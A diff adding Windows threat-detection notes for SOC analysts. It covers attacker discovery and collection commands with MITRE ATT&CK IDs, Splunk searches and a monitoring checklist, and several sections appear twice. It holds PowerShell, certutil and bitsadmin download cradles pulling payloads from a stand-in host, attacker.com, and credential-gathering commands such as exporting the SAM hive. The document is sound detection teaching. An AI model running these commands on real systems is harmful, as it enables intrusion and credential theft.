@@ -2184,3 +2184,170 @@ EventCode=1
 ✅ Preserve logs and memory image for forensics
 ✅ Document the attack timeline for incident report
 ✅ Escalate to L2/L3 with full findings
+## Windows Threat Detection — Discovery and Collection
+
+### Attack Phase Context
+Initial Access → Discovery → Collection → Exfiltration
+(get in) (look around) (grab data) (steal it)
+
+At any point in the attack, threat actors can also:
+- **Exfiltrate** stolen data to an external server
+- **Download new malware** if additional tools are needed
+- Note: Attackers do NOT start with all tools — they download
+  only what is necessary to avoid detection
+
+---
+
+### Discovery vs Collection
+| | Discovery | Collection |
+|---|---|---|
+| **Goal** | Identify the victim environment | Acquire sensitive data |
+| **When** | Immediately after Initial Access | After Discovery |
+| **Focus** | Users, systems, network, security tools | Files, credentials, emails, databases |
+| **Detection** | Sysmon process execution (Event 1) | File access, archive creation, staging |
+| **Example commands** | whoami, ipconfig, net user, tasklist | copy, compress, xcopy, 7zip |
+
+---
+
+### Common Discovery Commands Attackers Use
+| Command | Purpose | MITRE Technique |
+|---------|---------|----------------|
+| `whoami` | Identify current user and privileges | T1033 |
+| `whoami /priv` | List current user privileges | T1033 |
+| `whoami /groups` | List group memberships | T1069 |
+| `net user` | List all local users | T1087 |
+| `net localgroup administrators` | List admin group members | T1069 |
+| `net group /domain` | List domain groups | T1069 |
+| `ipconfig /all` | Network configuration | T1016 |
+| `arp -a` | ARP table — nearby hosts | T1016 |
+| `netstat -ano` | Active network connections | T1049 |
+| `net view` | List network shares | T1135 |
+| `tasklist` | List running processes | T1057 |
+| `sc query` | List running services | T1007 |
+| `systeminfo` | OS and hardware details | T1082 |
+| `wmic product get name` | Installed software | T1518 |
+| `dir /s /b C:\Users` | Browse user directories | T1083 |
+| `reg query` | Query registry keys | T1012 |
+
+---
+
+### Common Collection Commands Attackers Use
+| Command | Purpose | MITRE Technique |
+|---------|---------|----------------|
+| `copy file destination` | Copy sensitive files | T1005 |
+| `xcopy /s /e folder dest` | Copy entire folder tree | T1005 |
+| `robocopy source dest /e` | Bulk file copying | T1005 |
+| `7z a archive.zip folder` | Compress files for exfiltration | T1560 |
+| `findstr /si password *.txt` | Search for passwords in files | T1552 |
+| `dir /s /b *password*` | Find files with password in name | T1083 |
+| `reg export HKLM\SAM sam.reg` | Export SAM registry hive | T1003 |
+| `vssadmin list shadows` | Find volume shadow copies | T1003 |
+
+---
+
+### Discovery Detection with Sysmon
+Discovery commands leave clear traces in **Sysmon Event ID 1**
+(Process Creation) because they are all command-line tools.
+
+**Suspicious discovery process chain:**
+powershell.exe
+↓ (Sysmon Event 3 — network connection)
+Download from attacker C2
+↓ (Sysmon Event 11 — file created)
+New executable written to disk
+↓ (Sysmon Event 1 — process created)
+New malware executed
+
+**Common download commands:**
+```powershell
+# PowerShell download cradles
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+Invoke-WebRequest -Uri http://attacker.com/tool.exe -OutFile C:\tool.exe
+certutil -urlcache -split -f http://attacker.com/tool.exe tool.exe
+bitsadmin /transfer job http://attacker.com/tool.exe C:\tool.exe
+```
+
+**Splunk search — Suspicious download:**
+```spl
+index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+(CommandLine="*DownloadString*" OR CommandLine="*Invoke-WebRequest*"
+OR CommandLine="*certutil*urlcache*" OR CommandLine="*bitsadmin*transfer*")
+| table _time, ComputerName, user, CommandLine
+```
+
+---
+
+### MITRE ATT&CK Techniques Reference
+| Phase | Technique ID | Name | Example |
+|-------|-------------|------|---------|
+| Discovery | T1033 | System Owner/User Discovery | whoami |
+| Discovery | T1057 | Process Discovery | tasklist |
+| Discovery | T1082 | System Information Discovery | systeminfo |
+| Discovery | T1016 | System Network Configuration | ipconfig, arp |
+| Discovery | T1049 | System Network Connections | netstat |
+| Discovery | T1069 | Permission Groups Discovery | net localgroup |
+| Discovery | T1087 | Account Discovery | net user |
+| Discovery | T1135 | Network Share Discovery | net view |
+| Discovery | T1518 | Software Discovery | wmic product |
+| Discovery | T1083 | File and Directory Discovery | dir /s |
+| Collection | T1005 | Data from Local System | copy, xcopy |
+| Collection | T1560 | Archive Collected Data | 7z, zip |
+| Collection | T1552 | Unsecured Credentials | findstr password |
+| Collection | T1003 | OS Credential Dumping | reg export SAM |
+
+---
+
+### Discovery and Collection SOC Checklist
+
+**Common download commands:**
+```powershell
+# PowerShell download cradles
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+Invoke-WebRequest -Uri http://attacker.com/tool.exe -OutFile C:\tool.exe
+certutil -urlcache -split -f http://attacker.com/tool.exe tool.exe
+bitsadmin /transfer job http://attacker.com/tool.exe C:\tool.exe
+```
+
+**Splunk search — Suspicious download:**
+```spl
+index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+(CommandLine="*DownloadString*" OR CommandLine="*Invoke-WebRequest*"
+OR CommandLine="*certutil*urlcache*" OR CommandLine="*bitsadmin*transfer*")
+| table _time, ComputerName, user, CommandLine
+```
+
+---
+
+### MITRE ATT&CK Techniques Reference
+| Phase | Technique ID | Name | Example |
+|-------|-------------|------|---------|
+| Discovery | T1033 | System Owner/User Discovery | whoami |
+| Discovery | T1057 | Process Discovery | tasklist |
+| Discovery | T1082 | System Information Discovery | systeminfo |
+| Discovery | T1016 | System Network Configuration | ipconfig, arp |
+| Discovery | T1049 | System Network Connections | netstat |
+| Discovery | T1069 | Permission Groups Discovery | net localgroup |
+| Discovery | T1087 | Account Discovery | net user |
+| Discovery | T1135 | Network Share Discovery | net view |
+| Discovery | T1518 | Software Discovery | wmic product |
+| Discovery | T1083 | File and Directory Discovery | dir /s |
+| Collection | T1005 | Data from Local System | copy, xcopy |
+| Collection | T1560 | Archive Collected Data | 7z, zip |
+| Collection | T1552 | Unsecured Credentials | findstr password |
+| Collection | T1003 | OS Credential Dumping | reg export SAM |
+
+---
+
+### Discovery and Collection SOC Checklist
+✅ Monitor for rapid sequence of recon commands from same host
+✅ Alert on whoami, systeminfo, ipconfig in quick succession
+✅ Watch for net user and net group commands from non-admin users
+✅ Alert on archive creation tools (7zip, rar) on sensitive hosts
+✅ Monitor for findstr or dir searching for password keywords
+✅ Watch for certutil, bitsadmin or PowerShell download cradles
+✅ Alert on new executable files created in temp or user directories
+✅ Correlate discovery activity with recent Initial Access events
+✅ Check if discovery commands ran as SYSTEM or elevated user
+✅ Escalate to L2 if discovery followed immediately by Initial Access
